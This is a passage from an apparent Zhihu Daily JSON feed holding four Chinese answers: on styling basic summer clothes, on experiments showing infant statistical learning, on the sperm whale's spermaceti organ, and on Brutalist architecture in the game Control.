Fan，</span><span>我有一只超棒的变美公众号panfan007</span>\n<a href=\"https://www.zhihu.com/question/46868687/answer/2000394337\" hidden>阅读原文</a>\n</div>\n<div>\n<p>要怎样利用基本款穿出时髦感与风格来，是夏季永恒的时尚功课。</p>\n<p>我自己也不敢说这门课我就得高分了，但一直都在努力践行，今天就把总结到的一些我认为<strong>还算有用</strong>的方案分享给大家。</p>\n<figure></figure><p><strong><strong>一. 三个细节</strong></strong></p>\n<p><strong>衬衫</strong>、<strong>背心</strong>、<strong>T 恤</strong>，没了，夏天能穿的上半身单品就这三样，我不信还能有谁搞出第四样来，我众筹给他搞个人类进步奖。</p>\n<p>这三个单品，如果选择基本款，大家可以围绕三个细节来做文章，这三个细节上如果有设计感，就足以让你的整个造型都有个人特色。</p>\n<p>第一个是<strong>领口</strong>，夏季的上装，选对领口就是选对时尚。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-c21a17ec095916cbb8c8e7ab6ad08b36_720w.jpg?source=8673f162\" alt=\"\"></figure><p>夏季基本款能发挥的<strong>最大空间</strong>就在领口，像左上图，一件 T 恤衫有什么可看的，但是加上大 Polo 领跟扣子，这位博主的整个造型就撑起来了。</p>\n<p><strong>头小</strong>、<strong>肩膀长得好</strong>的姑娘，夏天别浪费你们的优势，不必执着于各种大方领大圆领，就该多多考虑在衣领上做文章的基本款上装，既能突出你们<strong>灵巧优雅</strong>的体型，又可以轻松穿出<strong>文艺感</strong>的调调，在人群中格外亮眼。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6a56f38a48169e74a7331c26d2a1976b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>相反，头大的女孩，千万清醒点，都把胸口给我敞开，把脖子<strong>整条地</strong>露出来！</p>\n<p>大头姑娘们夏天选择基本款上装时，圆领方领 V 领啥的，不重要，就一点，选择比常见的领口<strong>再低跟大</strong>个两三厘米的款式。</p>\n<p>就大概类似这样：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4b9d7409b26d32b1a051bf98e6e07405_720w.jpg?source=8673f162\" alt=\"\"></figure><p>只要这一点就妥了，一方面是为了解决夏季穿得单薄、不易修饰比例的问题，另一方面，我说实话，我可从来没见过穿<strong>超低领基本款</strong>不好看的女孩。</p>\n<p>衣领<strong>大而低 + 简洁</strong>的样式，绝对是永不出错的夏季选择，我甚至可以笼统地说，整个<strong>90 年代</strong>的时尚就是建立在这个组合的基础之上的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9fea9e848f0fab23b8ac9fb534eeb756_720w.jpg?source=8673f162\" alt=\"\"></figure><p>第二个细节，<strong>后背</strong>。</p>\n<p>利用后背设计有巧思的基本款来表达自己的时尚态度，是夏季最不会犯品味错误的搭配方案。</p>\n<p>背上随意一系的飘带、不过分用力的蝴蝶结、简洁的交叉带设计，等等，都是很好的选择，未必需要露很多，不经意的<strong>一点点</strong>就行，对于比较保守的姑娘来说，应该都很容易接受。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-91e03434e3731bb0033c5d94f5b192b8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>第三，<strong>袖子</strong>。</p>\n<p>整个 2020 和 2021，全球时装市场给予了泡泡袖无与伦比的地位，因为没有新花样可以玩了！夏天如果不穿背心，就看谁的袖子花样够靓。</p>\n<p>尤其是和我一样爱穿<strong>衬衫</strong>的各位，衬衫的袖子是风格的重要组成部分，在选购衬衫时，注意观察袖口的样式，会很大程度上影响一件基本款衬衫的风格。</p>\n<p><strong>灯笼袖</strong>是我的偏爱，<strong>休闲放松</strong>是一方面，关键是，利用袖子的宽阔反衬上半身跟手腕的<strong>纤细</strong>，就它最管用。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d32e7dd3d0d8380cc636fe54188efe07_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>二. 服装与鞋子的公式</strong></strong></p>\n<p>夏天能选的鞋子样式比冬天多多了，再加上露了腿，鞋子的重要程度更加翻倍，想要穿出范儿，一定要在鞋子上下功夫。</p>\n<p>我觉得夏天任何鞋子都是正确的（除了洞洞鞋，对不起，我真的承受不了这个，谁穿都一样！），连人字拖都是对的，不分高低，关键在于怎样与衣服组合，我这里分享给大家两个好用的公式。</p>\n<p><strong>1. 衣服越帅，鞋子越懒</strong></p>\n<p>很多姑娘在搭配的时候总有种错觉，如果走一个风格路线，那就该从上到下<strong>完全贯彻</strong>才和谐。这种方案在春秋冬也许凑合，但在夏季，这正是让我们多数人变得<strong>毫无特色</strong>的主要原因。</p>\n<p>当穿比较帅气的风格时，问题尤其明显，帅气的服装配老爹鞋靴子啥的，想象中相当和谐，但我们<strong>普通人</strong>穿出来，效果多多少少就有点像沃尔玛超市的模特。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c0f646a0840cdfdc4a4096d65b748ed1_720w.jpg?source=8673f162\" alt=\"\"></figure><p>衣服穿得越帅，鞋子越要<strong>随便</strong>、越要<strong>懒洋洋</strong>，这是我在社交账号关注了近百位各国博主后得出的<strong>终极结论</strong>，这是他们夏季个个爱用的致胜时尚法宝！</p>\n<p>搭配帅气的基本款服装时，极简的<strong>凉鞋凉拖</strong>最好用，一身儿搭配<strong>有张有弛</strong>，比配什么球鞋靴子更有型。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c04b251fea978d2d5a77cf1c305798e9_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>2. 衣服越质朴，鞋子越优雅</strong></p>\n<p>这里所谓的“质朴”，是指两个方面。</p>\n<p>一方面是指<strong>材质</strong>，比较粗粝的棉麻就是<strong>质朴</strong>的，而缎面真丝雪纺，当然就是相对比较<strong>华丽</strong>的；</p>\n<p>另一方面是指<strong>样式</strong>，一点花样都没有的基本款就是质朴的，尽管颜色跟样式并不稀奇古怪、但在<strong>廓形</strong>跟<strong>细节</strong>处有多多设计感的单品，就不能说是质朴了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7a0dd186f5b2f64f89a4efe4f1192054_720w.jpg?source=8673f162\" alt=\"\"></figure><p>质朴的穿搭 + 随便的鞋子=硬件终极大考验。当衣服鞋子都很质朴时，根据我个人的经验，常常是出门前照镜子，自我感觉是不用力时髦的鼻祖，走在路上路过橱窗不经意一照，崩溃，这个<strong>邋遢鬼</strong>是谁！</p>\n<p>所以，衣服质朴时，还是不要追求从头到脚的舒适，选一双优雅的鞋子会有型得多。</p>\n<p>这样一组合就聪明了，质朴的穿搭表达出老娘根本不 care 别的只在乎自己舒不舒服的<strong>贵气态度</strong>，而优雅讲究的鞋子低调展示本尊<strong>实则优美</strong>的灵魂！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-68fcbd10b07e747dc1c20cd8cf94f2c1_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>三. 饰品与穿搭的互补</strong></strong></p>\n<p>夏天搭配没有秋冬有趣，但饰品的发挥空间就大太多了，如果夏天不戴饰品，就不要问“为什么我穿基本款好路人”这种问题！</p>\n<p>但我认为<strong>乱堆砌</strong>的饰品并<strong>不加分</strong>，饰品也未必非要跟衣服配套。</p>\n<p>在出席比较重要的场合或者拍照做造型的时候，饰品服饰<strong>配套</strong>是很好的，但日常生活中，太配套就常常显得有点<strong>用力过猛</strong>。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-9a9963d64eead2c9c86e3e5680761586_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我个人试过比较好用的方案有<strong>三个</strong>。</p>\n<p>首先，<strong>男孩子气的穿法</strong>+<strong>温柔恬静的饰品</strong>，丝巾与硬朗廓形的仔裤、珍珠与 tomboy 风格的上装，诸如此类，是我的最爱，让中性的基本款单品体现出别样的小小精致，刚刚好。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-905450b908bed8b18c019cf7a3d38f5a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其次，<strong>夸张耀眼</strong>的时装饰品 + 成熟的<strong>女人味造型</strong>，是时尚都市职场人的经典必备套路。</p>\n<p>一步裙和 blingbling 的宝石戒指，卷起袖子的衬衫跟粗粗宽宽的复古手环，等等，配出来就是时髦又有主见的都市丽人，每一部职场时装剧的主角都是你。</p>\n<p>但这个套路，我提醒一下，适合本身气质<strong>比较成熟</strong>或者气场<strong>比较强</strong>的女生，否则会压不住。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-7b81316327bf16b01476378e13499181_720w.jpg?source=8673f162\" alt=\"\"></figure><p>第三，<strong>简洁中性</strong>的饰品 +<strong>文艺斯文</strong>的服装，可以用最低的成本轻松实现大家想要的“同款不同味”。</p>\n<p><strong>棒球帽</strong>是最好用的，很多读者问我到底在什么搭配里使用棒球帽最点睛，我个人觉得就是这类造型了，另外，<strong>双肩包</strong>、极简设计的<strong>金属饰品</strong>也同样好用。</p>\n<p>不要担心不搭，配出来个个是日系杂志的模特。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-46a027c4c6e7b95c92607ec3296b151f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure></figure><p>大家可能觉得，都买基本款了，不就是为了不动脑子乱穿么？为什么还要费心搭配？那基本款的意义在哪里？</p>\n<p>这想法，爱美的各位一定要纠正，基本款的意义不在于随便一套就无敌好看，它不具备这样的功能。</p>\n<p>基本款最大的意义在于让我们在<strong>清爽</strong>、<strong>得体</strong>、<strong>经典</strong>的基础上，按照<strong>个人的喜好</strong>去打造美，因为基本款给了我们最多的发挥空间，基本款的造型拥有最多的<strong>留白</strong>，这些留白，如果不去利用，那就太可惜了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/46868687\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738183"},{"title":"婴儿有逻辑思维能力吗？如何通过实验证明呢？","date":"2021-07-17 23:06:58","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/507c6f119_l.jpg?source=8673f162\"><span>张剑锋，</span><span>神经科学科研工作者</span>\n<a href=\"https://www.zhihu.com/question/269076156/answer/347992011\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这个问题感觉换个问法可以是：在婴儿发展出言语能力之前，如何通过其他的指标（行为，脑影像），来说明婴儿的各项认知能力。</p>\n<p><strong>行为实验</strong>上，以语言习得的统计学习为例：</p>\n<p>统计学习的观点认为：人之所以能把连续不断的语音流人为的划分边界，切分为一个一个的词，从而习得语言。是因为有些声音经常一起出现，久而久之这些声音就被绑定在了一起，用来表征单个声音物体了</p>\n<p>研究婴儿是如何学习语言的统计学习实验是这么做的：</p>\n<blockquote>首先：给婴儿先听一个语音串，这个语音串里包含了 4 个词，这些词会重复很多遍，每个词由三个音节组成。<br>接着：听完后会有一个测试。即在左侧（或右侧）给婴儿放一个语音串中出现过的词，然后在另一侧放一个没有出现过的词。看婴儿更倾向于听哪一个词。<br><br>这两个词所用的音节在之前放的语音串中出现的次数是一样的，所以物理刺激上，音节听到过的次数一样多。区别在于，词中的三个音节总是一块儿出现的，因此可以认为有一定的模式。而另一个没有出现过的词，这三个音节出现在语音串中的位置是随机的。<br><br>婴儿更倾向于注意新颖的事物，因此通过观察婴儿花在注意两个词上的时间，就可以判断婴儿是否有在听了那一长串语音后，学会其中出现过的那个词了。实验结果也是婴儿花在没听到的那个词上的时间更多，因此可以推论他 / 她学到了那一长串语音流中出现的词。</blockquote>\n<p>诸如此类，一般婴儿的研究都需要借助一些婴儿特定的行为模式（如上述实验中，更倾向于注意新颖刺激），来进行研究。</p>\n<p><strong>脑电实验：</strong>婴儿无法进行行为报告，但可以直接通过影像的指标来研究。还是一个语言学习的例子。当给婴儿听一串由 4 个三音节词组成的语音串的时候，同时记录婴儿的脑电活动。发现词之中的三个音节的脑电响应将不同。如下图所示：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-40f404062cbe7793f2730f2313053728_720w.jpg?source=8673f162\" alt=\"\"><figcaption>每个音节时长 500ms，蓝色为第一个音节持续时间内的脑电响应，红色为第二个的，绿色为第三个的。第一张图为第二张图按照音节起始点重新对齐后的结果。</figcaption></figure><p>这个实验不需要外显行为的指标，通过脑电响应就说明了婴儿具有学习语言的能力（如果没有习得词，而只是加工音节，那么三个位置的音节的响应应该是一样的）。此外，更神奇的是，实验是在婴儿睡觉的时候做的，也就是说，这种学习可以在意识之外，内隐习得。</p>\n<p>如上述两个实验所述，婴儿的研究还是需要通过其他指标来测量和推论的，而不是像成人一样，主要通过言语（给指导语，报告成绩）来完成。但婴儿肯定是有逻辑思维能力的，而且学习能力可能还很惊人。</p>\n<p><strong>Reference</strong></p>\n<p>Saffran, J. R., Aslin, R. N., &amp; Newport, E. L. (1996). Statistical learning by 8-month-old infants. Science, 274(5294), 1926-1928.</p>\n<p>Teinonen, T., Fellman, V., Näätänen, R., Alku, P., &amp; Huotilainen, M. (2009). Statistical language learning in neonates revealed by event-related brain potentials. BMC neuroscience, 10(1), 21.</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/269076156\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738217"},{"title":"抹香鲸方形的额头有特殊作用吗？","date":"2021-07-17 23:06:52","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/aaa187e4f5a36adeed6c63eee2ec4d67_l.jpg?source=8673f162\"><span>喵鱼酱，</span><span>海洋生物科研学徒</span>\n<a href=\"https://www.zhihu.com/question/271003685/answer/360321119\" hidden>阅读原文</a>\n</div>\n<div>\n<p>抹香鲸体型最明显的特征就在于它巨大的方形大脑，其头部长约占体长的三分之一至四分之一，一般雄性脑袋占的比例会比雌性的更大些。而鲸脑油主要就贮存在抹香鲸头部称为<strong>“抹香鲸脑油器”（Spermaceti Organ 或称 Case）</strong>的腔室中。一头抹香鲸的头部可能含有 1000 升以上的鲸脑油。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-17154247fcc9f191df74bbb8268f05d8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>↑抹香鲸成体的头部矢状截面及横截面图解</p>\n<p>事实上鲸脑油在抹香鲸头部主要储存于两处。一处是上文说的<strong>“抹香鲸脑油器”、“鲸油囊”（Spermaceti Sac）</strong>，所谓的鲸油囊是一个大型纵向分布的、半子弹形的结构，由又软又白的海绵组织构成，其上部和周边都被极其坚韧的纤维状组织包围着；腹侧由结缔组织包围，后侧则是鼻囊的憩室。剩下的鲸脑油则储存于一系列直角梯形块的组织中<strong>（称为 junk）</strong>，这些组织被许多坚韧的纤维状结缔组织所分离成一格一格的状态（见上图绿圈）。</p>\n<p>下图是真实的抹香鲸头部皮肤被剥离后露出的结构，隐约可看到上图图画的直角梯形组织。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-71f2c14ec959c9614d287ae34706f734_720w.jpg?source=8673f162\" alt=\"\"></figure><p>鲸脑油是一种白色的蜡状物质，实际熔点接近或略高于抹香鲸的体温，其密度变化受温度与压强共同影响。关于鲸脑油在抹香鲸体内的作用，主要有以下两种说法。</p>\n<p><strong>一、帮助抹香鲸调节自身上浮与下潜</strong></p>\n<p>当鲸脑油温度与抹香鲸体温相近时，鲸脑油呈现出液态流动状，而冷却到室温的时候，其能够凝固成类似石蜡的固态，但硬度不如石蜡。一般认为抹香鲸会通过<strong>增加局部血流量或吸入冰冷海水的方式，调节鲸脑油腔室内的温度，让鲸脑油溶解或凝固，从而改变比重，由此作为其浮力调节剂</strong>。据 Clarke 在 1978 年的文献中记载，抹香鲸只需将鲸脑油的温度往下调节 3°C 左右，就能够使鲸脑油的密度变化到能够使整个个体在 200 米的水深以下保持<strong>中性浮力</strong>的状态。一直以来人们认为抹香鲸在所有已知的鲸类当中下潜深度最大、时间最长，不过这一记录已于 2014 年被 Schorr 等人的研究结果刷新，柯氏喙鲸勇夺潜水桂冠（见文章：<a href=\"http://link.zhihu.com/?target=http%3A//journals.plos.org/plosone/article%3Fid%3D10.1371/journal.pone.0092633\" target=\"_blank\" rel=\"nofollow noreferrer\">First Long-Term Behavioral Records from Cuvier’s Beaked Whales (Ziphius cavirostris) Reveal Record-Breaking Dives</a>）。尽管如此，抹香鲸的下潜能力之强我们有目共睹。</p>\n<p><strong>二、校准和聚焦抹香鲸发出与接收的声波</strong></p>\n<p>抹香鲸是当前世界上发现的最大齿鲸。齿鲸声音的发声机理是通过挤压空气进入一个称为<strong>“声唇”（‘Museau de singe’，法语，”猴唇“之意）</strong>的类似人类鼻腔的结构而产生的（见上图蓝圈）。有假说称抹香鲸能够利用鲸脑油聚焦高频声波，并发出声波震晕猎物。此说法还具有争议。但是经研究发现，鲸脑油的声音传播速度的确会在特定压强随着温度的升高而下降，在特定温度随着压强的升高而增加，而且声速值与变化规律与声音在海水中的传播速度是相近的。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3953022a1de6ccda741b577fc27b8ff9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>↑上下两图分别为两份鲸脑油样品中测出的鲸脑油中声速与温度、压强的关系</p>\n<p>所以总的说来抹香鲸方形的额头主要是为了储存帮助它调节浮力和进行回声定位的物质，而且方形额头内部的结构也有助于更好地行使这两项功能。尽管小型齿鲸也有回声定位的能力，但是小型齿鲸的额隆体积一般只有整体体积的 5%左右（见下图），而抹香鲸用于回声定位的结构体积之所以这么大，据推测或许与它们捕食最喜爱的食物——海洋<strong>中深层</strong>的<strong>大型</strong>鱿鱼——的习性有关系。</p>\n<p>↓这是小型齿鲸（此处以白海豚为例）的骨架图，它的头骨上方也有一块空的地方，这里就是它的额隆所在之处。（图源：<a href=\"http://link.zhihu.com/?target=http%3A//conservedolphins.weebly.com/dolphin-skeletons.html\" target=\"_blank\" rel=\"nofollow noreferrer\">Dolphin skeletons</a>）</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-af516b9c994c66a9e4db490ca518ced8_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/271003685\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738179"},{"title":"有什么和建筑有关好玩的游戏，对建筑学习有启发？","date":"2021-07-17 23:06:47","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-110aad5bb5754a05b709818b9387792b_l.jpg?source=8673f162\"><span>毁男孩的小图纸，</span><span>个人公众号：电影设计师</span>\n<a href=\"https://www.zhihu.com/question/310699756/answer/1980298038\" hidden>阅读原文</a>\n</div>\n<div>\n<p>为什么没有人提到《控制》？</p>\n<p>作为毕业于建筑专业的斜杆青年，在 19 年发售时就立刻买了这款游戏的 PS4 光碟，不光是因为这款游戏在光线追踪技术的加持下所达到的画质级别，更在于其借鉴于建筑学粗野主义的游戏美学与探索模式。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-886f9077aaae85d3a26a12c7df6f0eb2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>控制中的建筑空间</figcaption></figure><p>对于《控制》这款游戏，可能游戏界经常拿它来作为游戏破碎交互系统的典型案例，但很少有人谈到它极富建筑美学的场景设计。</p>\n<p>当你操控着游戏主角杰西·法登漫游在充满超自然力量的神秘大楼内时，你会被里面宏大、抽象且诗意的场景氛围所感染，光线与混凝土结构完美地交织在一起，宛如欣赏一位建筑大师的杰作。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b6b5b5f3cf7e13d22cf99ed04af33d55_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《控制》中类似盗梦空间的世界设计</figcaption></figure><p>下面我举例聊聊《控制》场景设计上对建筑学粗野主义大师作品的借鉴，从中我们也将发现游戏本身是如何在漫游和体验中创造出一种精神性空间体验的。</p>\n<p>《控制》的剧情也非常简单，主角杰西·法登的弟弟很小的时候就被一个神秘的研究超自然现象的组织抓走了，据了解被关进了一栋叫 Oldest Building 的联邦控制局大楼里。游戏的开始，杰西将从繁华的街道进入这栋神秘大楼，开始对这个连接着邪恶力量的建筑进行探索。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-dbbe791ac741e6f9b84c6546f448f1d9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>玩家操控的游戏主角杰西·法登</figcaption></figure><p>这栋 Oldest Building 其实是有原型的，它就是位于纽约曼哈顿岛托马斯街 33 号美国电话电报公司旗下的长线大楼（At&amp;t Long Lines Building）。于 1974 年被建造，设计师为约翰·沃内克，意在创造一个“20 世纪的堡垒”。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8e99095123db95bfec64f9dda3003c41_720w.jpg?source=8673f162\" alt=\"\"><figcaption>位于纽约曼哈顿的长线大楼</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-6ab9a23c0d615a50432eebc1721b3b7b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>现实中的长线大楼和控制中的 Oldest Building</figcaption></figure><p>这栋大楼非常神秘，高 167 米，共 29 层，但没有一扇对外的窗户，据说那里是联邦调查局的秘密研究机构，能够抵御核攻击。《窃听》曾发文揭露美国政府在内部开展全球的窃听监视活动，这些特征和故事大大启发了游戏中“联邦控制局”最初的设计。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-85a929c34d12529a8ee6cc42746f53cb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>长线大楼入口与联邦控制局大楼（Oldest Building）入口</figcaption></figure><p>这栋大楼的设计便是上个世纪 50-60 年代流程的建筑粗野主义风格，如果你经常看科幻片的话，你会发现以混凝土为主要建筑材质的粗野主义建筑常常作为反派的集权象征，能够传达出一种权威和压迫的力量。</p>\n<p>实时上，真实的神秘机构，比如联邦调查局，确实也常常选择粗野主义的建筑作为其办公基地，比如粗野主义的标志建筑约翰·埃德加·胡佛大楼（ J. Edgar Hoover）以及他们在匡蒂科（Quantico ）的培训设施。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-26479d995709f0200ec9e5d45bfbb23c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>约翰·埃德加·胡佛大楼</figcaption></figure><p>而游戏中的联邦控制局，同样是一个全球通信窃听和封闭管理的机构，它的神秘精神空间的总部被称为“总机”，到处充满了被邪恶力量感染的研究人员及变化莫测的空间结构。</p>\n<p>下面我们来说说联邦控制局大楼的内部</p>\n<p>在穿越开场的行政走廊时，你会看到非常多混凝土和木结构材料、地毯和古董家具的设计组合，这很容易让人看到建筑大师路易斯·康（Louis.I.Kahn）的设计，特别是他在耶鲁大学英国艺术中心的室内杰作。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-45ff09ecd3bc554055aecac35b0f39f3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>耶鲁大学英国艺术中心</figcaption></figure><p>但随着背景音乐转向平静与神秘，压迫感伴着简介的办公区扑面而来。办公区的尺寸非常大，基本上都是大平层的开阔空间，办公桌、橱柜、饮水机重复地排列着，尺度上变得非常压抑。</p>\n<p>这里要提到 1982 年普利兹克建筑奖获奖者：凯文·罗奇（Kevin Roche），他在于沙里宁合作的约翰迪尔总部大楼的设计中，采用了这种大平层的设计，秘书室的桌椅僵硬地重复排列着，宛如一个现代化办公的流水加工长。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-26b54daff993a1b62905e4f1901ffb76_720w.jpg?source=8673f162\" alt=\"\"><figcaption>凯文·洛奇的办公区设计与游戏中的办公区</figcaption></figure><p>这种理念是受到了当时的管理学大师弗雷德里克·温斯洛·泰勒倡导的《科学管理原理》的影响，认为办公室就像工厂一样，需要组织起来，家具、书桌、橱柜和隔板被系统地放置，以保持员工专注和工作台面整洁，最大限度地提高效率并提高生产力。</p>\n<p>这种方式让员工宛如在监狱被看守的环境下办公，但非常符合《控制》中的主题和联邦控制局的邪恶价值观。如果你仔细游玩游戏，你甚至会在墙上看到诸如“因轮班而导致的延迟不计入加班”的通告。</p>\n<p>接下来，当你进入联邦控制大厅时，你会看到一排排相同尺寸的巨大圆形灯阵，借鉴了匈牙利建筑师马塞尔·布鲁尔（Met Breuer）在纽约的画廊室内设计。这些灯阵在游戏中就像审问犯人的照灯，一切都在光的注视下，体现了办公空间的据对控制权。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-09ed0007dbd73af9c2c936a185de870d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Met Breuer 画廊与联邦控制大厅</figcaption></figure><p>说到混凝土建筑，你不可能不知道日本的建筑大师安藤忠雄（Tadao Ando），他在建筑空间的精神表达方面独树一帜，光之教堂、住吉的长屋、小筱邸等更是每个建筑生耳熟能详的案例。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d81e37e1d38b6c4faa4daa88b7014a56_720w.jpg?source=8673f162\" alt=\"\"><figcaption>安藤忠雄作品小筱邸住宅</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-9fd8f785362f3e4251f2e9b8693b1b4a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>作图为小小筱邸住宅走廊与游戏中的走廊</figcaption></figure><p>《控制》中的邪恶力量与宗教信仰有些千丝万缕的联系。比如邮件室的巨大通风管道聚集到一个类似教堂的透风密室，以及许多大型的通光孔洞，都在呼应安藤忠雄的作品。其中，游戏后期的“时钟入口”场景在带有不规则缝隙的走廊中逆光前行，基本就是在引用安藤光之教堂中的墙面十字切割透光设计。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4b074533878fba4696a3abf0f340c97c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《控制》中的类教堂空间</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-b1b903a149d5dc337b0562a861d7336d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>光之教堂与控制中的异世界大门</figcaption></figure><p>此外，死信档案室（Dead Letters Archive）借鉴了马塞尔·布鲁尔在圣弗朗西斯塞尔教堂的设计，这栋现代主义佳作激发了档案室的后墙混凝土凹槽设计，阳光从上方缝隙漫射下来，沐浴到下方的控制点上。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-47d306b4ac1c852b6f2d5a6d8c7bc041_720w.jpg?source=8673f162\" alt=\"\"><figcaption>马塞尔·布鲁尔设计的教堂与死信档案室</figcaption></figure><p>此外，《控制》中的建筑大量使用了“台阶”的元素，一层层几何感的退台和台阶构成了空间的韵律和神性，这种仪式感类似意大利建筑师卡洛·斯卡帕（Carlo Scarpa）在墓地设计中的常用手法。在卡洛·斯卡帕的布里昂家族墓园设计中，台阶变成了墙壁、柱子、门口和天花板，而这些都启发了游戏中的重复性象征元素，暗示了藏在建筑中的神秘力量。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-912c5386b72b1e988d0b318b4e8496e6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>布里昂家族墓园与游戏中的台阶元素</figcaption></figure><p>不仅如此，在控制局大楼的研究部门，巨大的大厅内点缀着各种黄铜雕塑，这些影子也可以在斯卡帕的 Olivetti(好利获得公司)陈列室中看到。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ca281dcd673f7585ace3547817c418d6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>游戏中的黄铜雕塑装饰</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-e43e223be3963418ce4cf8abe8fc7904_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Olivetti 陈列室设计中的黄铜元素</figcaption></figure><p>在研究中心通高的建筑中庭墙壁上，你能看到一些列大大小小的矩形纹路和小窗开口，这不单是游戏玩家可以通过浮空技能到达的关卡捷径入口，也是粗野主义建筑典型的装饰机构。在日本另一位建筑大师丹下健三（Kenzo Tange）的仓敷市美术馆中，你也能看到这样的设计。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-1e8bcc2a2d3c999049c4619553fc9fd9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>丹下健三的设计作品与游戏中的墙面</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-015eb6fc270ab0f0a4f38859a60ac93a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>游戏中可以看到与仓敷市美术馆相似的设计手法</figcaption></figure><p>对于暴露结构的粗野主义设计，天花板也是其独特的展示标志。这种类似“华夫饼”形状的混凝土梁网格，在《控制》中经常见到，游戏世界设计总监斯图亚特·麦克唐纳（Stuart Macdonald）曾表示多伦多大学士嘉堡分校的安德鲁斯大楼是游戏中控制中央大厅的重要参考来源，包括简约的楼梯间、阳台和混凝土、木板混合物、方格子天花板等。类似的真实建筑设计还有波士顿市政厅。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ab25f90b9c9dbfe2b5c3ed166943e113_720w.jpg?source=8673f162\" alt=\"\"><figcaption>安德鲁大楼</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-4ad9852ff7fa38a3a4d7403daadd3c37_720w.jpg?source=8673f162\" alt=\"\"><figcaption>安德鲁大楼内部</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-775d8db13c5fd956c703759fb4b5ee0d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>波士顿市政厅内部</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-c0503815deb121a253df9aae950a26f6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《控制》中的各种格子梁结构示意图</figcaption></figure><p>当然，除了集权式的办公行政空间，游戏后期的实验室开始出现了有机的装饰，比如疯狂生长的藤蔓和异化的孢子植物。实验空间也慢慢采用了更多不规律和不对成的构成元素，更多缤纷的色彩，暗示内部的不受控状态及研究者达林博士越来越错乱的精神，有机植物与混凝土的搭配在斯卡帕的布里昂家族墓园中也可以看到。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7c18483b31fa8cdd4f05c442ba9e7e99_720w.jpg?source=8673f162\" 